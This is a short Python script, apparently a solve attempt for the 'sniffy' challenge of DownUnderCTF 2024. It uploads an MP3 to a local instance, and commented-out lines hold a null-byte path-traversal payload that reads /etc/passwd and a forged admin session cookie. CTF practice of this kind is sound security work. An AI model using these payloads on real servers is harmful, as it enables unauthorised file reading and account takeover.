import requests 

url = "http://localhost:5555/?theme="
# url = "https://web-sniffy-d9920bbcf9df.2024.ductf.dev/audio.php?f="# k1.mp3%00../../../../../../../../../../etc/passwd"

r = requests.post(
    f"{url}",
    cookies={"PHPSESSID": "asdf"},
    files={ "file": open("src/audio/k1.mp3", "rb").read() }
)
print(r.text)
# r = requests.get(
#     f"{url}",
#     cookies={"PHPSESSID": "i56kgbsq9rm8ndg3qbarhsbm27", "path": "/", "user": "admin"}
# )
